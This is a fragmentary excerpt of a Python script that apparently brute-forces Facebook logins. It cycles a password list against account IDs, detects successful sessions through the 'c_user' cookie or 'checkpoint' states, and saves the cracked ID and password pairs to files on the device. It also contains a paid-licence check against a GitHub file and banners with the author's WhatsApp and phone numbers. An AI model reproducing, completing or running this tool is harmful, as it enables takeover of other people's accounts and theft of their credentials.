...
def uaku():
	try:
		...
		a=requests.get('https://github.com/Diloking/BADSHAH-/blob/main/PAID.TXT').text
		ua=open('.mix.txt','w')
...
def DiloALWAYSONFIRE():
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "᯾".join(uuid)
  server = requests.get(f'https://github.com/Diloking/BADSHAH-/blob/main/PAID.TXT').text
...
\033[1;93m--------------------------------------------------
\033[1;32m [+] FACEBOOK  : NO USE ðŸ˜‚
\033[1;32m [+] Author          : Dilo Badshah
\033[1;32m [+] WHATSAPP  : +923410788086
\033[1;32m [+] phone           : 0787642167
\033[1;32m [+] Version         : 1.3
\033[1;32m [+] FROM            : PAKISTAN 
\033[1;93m--------------------------------------------------
  ...
  try:
    httpCaht = requests.get(f"https://github.com/Diloking/BADSHAH-/blob/main/PAID.TXT").text
    if id in httpCaht:
      ...
      os.system(f'xdg-open {tan}://wa.me/+923410788086?text='+id)
      time.sleep(1)
      sys.exit()
  except:
    sys.exit()
...
def m1(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [Dilo] \033[1;36m•\033[1;37m %s \033[1;36m•\033[1;37m OK \033[1;36m•\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        Dilo=session.cookies.get_dict().keys()
                        if "c_user" in Dilo:
                                coki=session.cookies.get_dict()
                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\r\033[1;32m [Dilo\033[1;36m•\033[1;37m\033[1;32mOK] %s \033[1;36m•\033[1;37m\033[1;32m %s'%(ids,pas))
                                #cek_apk(session,coki)
                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                open(f'/sdcard/Dilo•OK•M1.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Dilo:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;208m [Dilo•CP] '+ids+' • '+pas+'\033[1;97m')
                                        open(f'/sdcard/Dilo•CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Dilo:
                                ...
                                #cek_apk(session,coki)
                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                open(f'/sdcard/Dilo•OK•M3.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Dilo:
                                if 'y' in pcp:
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Dilo:
                                ...
                                #cek_apk(session,coki)
                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                open(f'/sdcard/Dilo•OK•M2.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Dilo:
                                if 'y' in pcp:
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Dilo:
                                ...
                                #cek_apk(session,coki)
                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                open(f'/sdcard/Dilo•OK•M4.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Dilo:
                                if 'y' in pcp:
